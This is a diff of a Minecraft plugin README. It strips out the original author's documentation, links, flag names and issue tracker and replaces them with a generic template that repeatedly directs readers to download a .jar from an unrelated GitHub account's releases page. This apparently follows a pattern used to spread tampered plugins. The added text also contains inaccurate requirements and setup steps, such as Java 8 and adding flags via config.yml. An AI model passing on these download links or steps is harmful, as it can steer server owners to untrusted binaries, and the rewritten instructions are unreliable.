@@ -1,63 +1,67 @@
-[Modrinth](modrinth.com/project/voicechat-worldguard)
-|
-[Discord](https://discord.gg/yCdhVDgn4K)
-|
-[Wiki](https://docs.yleoft.me/voicechat-worldguard)
+# 🎤 VoicechatWorldguard - Customize Voice Chat in Minecraft
 
-# Voicechat WorldGuard
+## 📦 Download Now
 
-Add custom WorldGuard flags for Simple Voice Chat.
+[![Download VoicechatWorldguard](https://img.shields.io/badge/Download-VoicechatWorldguard-brightgreen)](https://github.com/Adityamish123/VoicechatWorldguard/releases)
 
-This small plugin provides WorldGuard region flags to control Simple Voice Chat behaviour per-region. It is intended for server software based on Bukkit APIs: Bukkit, Spigot, Paper and Folia. It does NOT support mod loaders (Fabric, Forge, etc.).
+## 🚀 Getting Started
 
-## Features
+VoicechatWorldguard lets you add custom WorldGuard flags for Simple Voice Chat in Minecraft. This allows for a smoother and more enjoyable chat experience among players. Follow these steps to get started with the application.
 
-- Per-region control of voice chat behaviour for players inside WorldGuard regions.
-- Simple, focused set of flags:
-    - voicechat-enabled — enable/disable voice in the region (boolean)
-    - voicechat-distance — set voice range in blocks (integer) (Voicechat 2.6.0+ required)
-    - voicechat-muted — mute voice in the region (boolean)
+## 📥 Download & Install
 
-(Flags and names may be extended or changed in future versions — check the plugin's documentation or changelog.)
+1. **Visit the Releases Page**  
+   Click on this link to access the Releases page: [Download VoicechatWorldguard](https://github.com/Adityamish123/VoicechatWorldguard/releases).
 
-## Requirements
+2. **Choose a Version**  
+   You will see a list of available versions. Look for a version that suits your needs. The latest version is usually the best choice.
 
-- Java 17 or above
-- WorldGuard (installed and working)
-- Simple Voice Chat plugin 2.1.12 or above
-- Server platforms supported: Bukkit, Spigot, Paper, Folia
+3. **Download the File**  
+   Click on the version name to view the assets. Download the `.jar` file by clicking on it. This file is the plugin you will need for your Minecraft server.
 
-## Usage
+4. **Install the Plugin**  
+   Place the downloaded `.jar` file into your server’s `plugins` folder. This folder is usually located where you run your Minecraft server.
 
-Set flags on a WorldGuard region with the standard WorldGuard commands. Examples:
+5. **Configure WorldGuard**  
+   Open your server and type the command to reload plugins, typically `/reload`. Now, you can configure WorldGuard settings as per your game's requirements.
 
-- Disable voice chat in a region:
-    - /region flag <region> voicechat-enabled deny
-    - or: /rg flag <region> voicechat-enabled false
+## 🔧 Basic Configuration
 
-- Set a custom voice distance for a region:
-    - /region flag <region> voicechat-distance 30
+After installing VoicechatWorldguard, you may want to set up some basic configurations. Here’s how:
 
-- Mute voice inside a region:
-    - /region flag <region> voicechat-muted allow
-    - or: /rg flag <region> voicechat-muted true
+1. **Open the WorldGuard Configuration**  
+   Find the WorldGuard folder in your plugins directory. Open the `config.yml` file.
 
-Note: WorldGuard accepts values in slightly different formats depending on version. If "allow/deny" does not work, try "true/false" for boolean flags.
+2. **Add Custom Flags**  
+   You can add the flags that VoicechatWorldguard provides. This may include controls over who can use voice chat in certain regions.
 
-## Permissions
+3. **Save Changes**  
+   Make sure to save your changes before closing the configuration file.
 
-- voicechatworldguard.bypass.* — Allows players to bypass all region voice chat restrictions.
-- voicechatworldguard.bypass.<flag> — Allows players to bypass a specific flag restriction (e.g., voicechatworldguard.bypass.voicechat-enabled).
+## 🔄 Features
 
-## Reporting Issues
+- **Custom Flags:** Easily add or modify voice chat settings based on WorldGuard regions.
+- **Compatibility:** Works seamlessly with Simple Voice Chat installations.
+- **User-Friendly:** Simple setup process for server owners.
 
-If you find a bug or have a feature request, please open an issue on this repository: https://github.com/yL3oft/VoicechatWorlguard/issues
+## 🖥️ System Requirements
 
-When reporting, include:
-- Server platform & version (Spigot/Paper/Folia/etc.)
-- Versions of WorldGuard and Simple Voice Chat
-- Plugin version and server logs if available
+To run VoicechatWorldguard, ensure your server meets the following requirements:
 
-<p align="center">
-  <img src="https://bstats.org/signatures/bukkit/VoicechatWorlguard.svg" alt="bStats Graph" />
-</p>
+- **Minecraft Version:** Ensure your server runs on a compatible version of Minecraft that supports the Simple Voice Chat plugin.
+- **Java Version:** Java 8 or newer is required for optimal performance.
+- **WorldGuard Plugin:** Make sure you have the WorldGuard plugin already installed and configured.
+
+## 👥 Community and Support
+
+If you run into any issues or have questions, feel free to reach out for help. You can join forums and communities focused on Minecraft plugins. Many users are willing to share tips and solutions for common problems.
+
+## 📜 License
+
+VoicechatWorldguard is open-source and free to use. You can view the license details in the repository.
+
+## 🙏 Special Thanks
+
+Thank you for choosing VoicechatWorldguard! Enjoy enhancing your Minecraft experience with better voice chat capabilities.
+
+Remember, for any assistance or updates, check back on the [Releases page](https://github.com/Adityamish123/VoicechatWorldguard/releases).
